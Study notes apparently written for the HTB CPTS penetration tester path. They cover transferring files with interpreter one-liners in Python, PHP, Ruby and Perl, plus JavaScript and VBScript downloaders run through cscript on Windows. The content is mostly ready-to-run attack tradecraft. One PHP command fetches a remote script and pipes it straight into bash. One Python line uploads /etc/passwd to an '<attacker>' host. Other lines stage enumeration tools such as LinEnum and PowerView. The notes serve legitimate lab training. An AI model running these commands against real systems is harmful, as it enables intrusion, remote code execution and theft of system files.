### CPTS / HTB Penetration Tester Path <br>
### File Transfers - Transferring Files With Code <br>
<mark>hook it up with a &#x2B50; if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>

<br>
<br>

---

### Transferring Files With Code



When OS-native binaries are blocked or missing, language interpreters that ship on most boxes (Python, PHP, Perl, Ruby, JS via `cscript`/`mshta`, VBScript) can replicate the same downloads/uploads. Most accept inline one-liners.

Python download — `urllib`/`urllib.request`:

```diff
+ $ python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
+ $ python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

PHP download (`-r` for one-liner mode) — `file_get_contents` + `file_put_contents`:

```diff
+ $ php -r '$file = file_get_contents("<url>"); file_put_contents("LinEnum.sh",$file);'
```

PHP `fopen()` for streaming:

```diff
+ $ php -r 'const BUFFER = 1024; $fremote = fopen("<url>", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```

PHP fileless pipe to bash:

```diff
+ $ php -r '$lines = @file("<url>"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

Ruby (`-e` one-liner):

```diff
+ $ ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("<url>")))'
```

Perl (`-e` one-liner):

```diff
+ $ perl -e 'use LWP::Simple; getstore("<url>", "LinEnum.sh");'
```

JavaScript (Windows) — save as `wget.js`, run with `cscript`:

```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

```diff
+ C:\> cscript.exe /nologo wget.js <url> PowerView.ps1
```

VBScript — save as `wget.vbs`, run with `cscript`:

```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

```diff
+ C:\> cscript.exe /nologo wget.vbs <url> PowerView2.ps1
```

Python upload (one-liner) — POST to a `uploadserver`:

```diff
+ $ python3 -m uploadserver
+ $ python3 -c 'import requests;requests.post("http://<attacker>:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

| Language | Download One-Liner Module | Notes |
|---|---|---|
| Python 2 | `urllib.urlretrieve` | EOL — only on legacy boxes |
| Python 3 | `urllib.request.urlretrieve` | Default on modern Linux |
| PHP | `file_get_contents`, `fopen`, `@file` | `-r` flag for one-liners |
| Ruby | `Net::HTTP.get` | `-e` flag |
| Perl | `LWP::Simple::getstore` | `-e` flag |
| JavaScript | `WinHttp.WinHttpRequest.5.1` | run via `cscript` |
| VBScript | `Microsoft.XMLHTTP` | run via `cscript` |
